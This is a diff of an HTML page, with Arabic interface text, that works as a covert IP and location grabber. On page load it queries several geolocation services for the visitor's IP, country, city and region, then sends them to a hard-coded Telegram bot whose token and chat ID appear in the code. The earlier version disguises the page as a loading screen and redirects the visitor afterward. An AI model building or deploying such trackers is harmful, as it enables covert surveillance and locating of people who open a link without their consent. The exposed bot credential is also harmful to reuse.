@@ -3,53 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل</title>
+    <title>تحديد الموقع</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
             font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             text-align: center;
+            margin-top: 50px;
+            direction: rtl;
         }
-        .loading {
-            font-size: 20px;
-            color: #333;
+        #result {
+            margin: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            display: inline-block;
         }
     </style>
 </head>
 <body>
-    <div class="loading">جاري التحميل، الرجاء الانتظار...</div>
+    <h1>جاري تحديد موقعك...</h1>
+    <div id="result"></div>
 
     <script>
         // بيانات البوت
         const BOT_TOKEN = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
         const CHAT_ID = '6913353602';
         
-        // دالة الحصول على IP والموقع
-        async function getIPAndLocation() {
+        // دالة الحصول على الموقع الدقيق
+        async function getAccurateLocation() {
             try {
-                // 1. الحصول على IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipResponse.json();
+                // استخدام ثلاث خدمات مختلفة للتحقق من الدقة
+                const [ipapi, ipinfo, geolocation] = await Promise.all([
+                    fetch('https://ipapi.co/json/').then(res => res.json()),
+                    fetch('https://ipinfo.io/json').then(res => res.json()),
+                    fetch('https://geolocation-db.com/json/').then(res => res.json())
+                ]);
                 
-                // 2. الحصول على الموقع
-                const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                const location = await locResponse.json();
+                // تحديد المدينة الأكثر تكراراً بين الخدمات
+                const cities = [ipapi.city, ipinfo.city, geolocation.city];
+                const cityCount = {};
+                cities.forEach(city => {
+                    if (city) cityCount[city] = (cityCount[city] || 0) + 1;
+                });
+                
+                const mostCommonCity = Object.keys(cityCount).reduce((a, b) => 
+                    cityCount[a] > cityCount[b] ? a : b
+                );
                 
                 return {
-                    ip,
-                    country: location.country_name || 'غير معروف',
-                    city: location.city || 'غير معروف',
-                    region: location.region || 'غير معروف'
+                    ip: ipapi.ip || ipinfo.ip || geolocation.IPv4,
+                    country: ipapi.country_name || ipinfo.country || geolocation.country_name,
+                    city: mostCommonCity,
+                    region: ipapi.region || ipinfo.region || geolocation.state
                 };
                 
             } catch (error) {
-                console.error('حدث خطأ:', error);
+                console.error('Error:', error);
                 return {
                     ip: 'غير معروف',
                     country: 'غير معروف',
@@ -73,16 +82,25 @@
                     })
                 });
             } catch (error) {
-                console.error('خطأ في الإرسال:', error);
+                console.error('Error sending:', error);
             }
         }
         
-        // بدء العملية عند تحميل الصفحة
+        // عند تحميل الصفحة
         window.addEventListener('DOMContentLoaded', async () => {
-            const { ip, country, city, region } = await getIPAndLocation();
+            const { ip, country, city, region } = await getAccurateLocation();
             
+            // عرض النتيجة للمستخدم
+            document.getElementById('result').innerHTML = `
+                <p><strong>عنوان IP:</strong> ${ip}</p>
+                <p><strong>البلد:</strong> ${country}</p>
+                <p><strong>المدينة:</strong> ${city}</p>
+                <p><strong>المنطقة:</strong> ${region}</p>
+            `;
+            
+            // إرسال البيانات إلى البوت
             const message = `
-                📌 <b>معلومات IP الجديدة:</b>
+                📌 <b>معلومات الموقع الجديدة:</b>
                 ━━━━━━━━━━━━━━━━━
                 • <b>IP:</b> <code>${ip}</code>
                 • <b>البلد:</b> ${country}
@@ -94,10 +112,11 @@
             
             await sendToTelegram(message);
             
-            // توجيه المستخدم بعد الإرسال
+            // إخفاء النتيجة بعد 5 ثواني
             setTimeout(() => {
-                window.location.href = "https://example.com"; // استبدل بالرابط المطلوب
-            }, 1500);
+                document.getElementById('result').style.display = 'none';
+                document.querySelector('h1').textContent = 'تم تحديد موقعك بنجاح';
+            }, 5000);
         });
     </script>
 </body>
